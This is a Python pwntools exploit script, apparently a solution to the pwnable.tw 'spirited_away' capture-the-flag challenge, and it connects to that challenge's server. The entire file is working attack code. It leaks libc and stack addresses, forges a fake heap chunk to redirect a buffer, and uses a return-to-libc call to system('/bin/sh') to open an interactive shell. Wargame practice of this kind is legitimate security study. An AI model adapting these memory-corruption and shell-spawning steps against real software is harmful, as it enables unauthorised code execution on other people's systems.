#!/usr/bin/env python3

from pwn import *
import subprocess

exe = ELF("./spirited_away_patched", checksec=False)
libc = ELF("./libc_32.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.binary = exe
context.log_level = 'debug'

def sa(msg, data):
    p.sendafter(msg, data)

def sla(msg, data):
    p.sendlineafter(msg, data)

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("chall.pwnable.tw", 10204)
    return r

p = conn()

##################################
### Stage 1: Leak libc address ###
##################################
sa(b'name: ', b'A')
sla(b'age: ', b'A')             # So that we won't need to enter age
sa(b'movie? ', b'A'*0x35)
sa(b'ment: ', b'A')

p.recvuntil(b'Reason: ')
p.recv(0x34)
libc.address = u32(p.recv(4)) - 0x1b0000 - ord('A')
log.info("Libc base: " + hex(libc.address))

sa(b'<y/n>: ', b'y')

###################################
### Stage 2: Leak stack address ###
###################################
sa(b'name: ', b'A')
sa(b'movie? ', b'A'*0x38)
sa(b'ment: ', b'A')

p.recvuntil(b'Reason: ')
p.recv(0x38)
stack_leak = u32(p.recv(4))
log.info("Stack leak: " + hex(stack_leak))

sa(b'<y/n>: ', b'y')

#######################################
### Stage 3: Fake chunk & Get shell ###
#######################################
for i in range(98):
    sa(b'name: ', b'A'*0x3c + b'B'*0x50 + b'C'*0x3c + b'yyy')

input("DONE! Press ENTER to continue...")
sa(b'name: ', b'A'*0x3c)
payload = flat(
    b'B'*0x8,
    0, 0x41, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0, 0, 0,
    0, 0x10001,
    )
sa(b'movie? ', payload)
payload = flat(
    b'C'*0x54,
    stack_leak - 0x60,
    )
sa(b'ment: ', payload)
sa(b'<y/n>: ', b'yyy')

payload = flat(
    b'A'*0x44,                        # Padding
    libc.sym['system'],
    b'BBBB',                          # Fake eip
    next(libc.search(b'/bin/sh')),    # Arg1
    0,                                # Arg2
    0,                                # Arg3
    )
sa(b'name: ', payload)
sa(b'movie? ', b'B')
sa(b'ment: ', b'C')
sa(b'<y/n>: ', b'nnn')

p.interactive()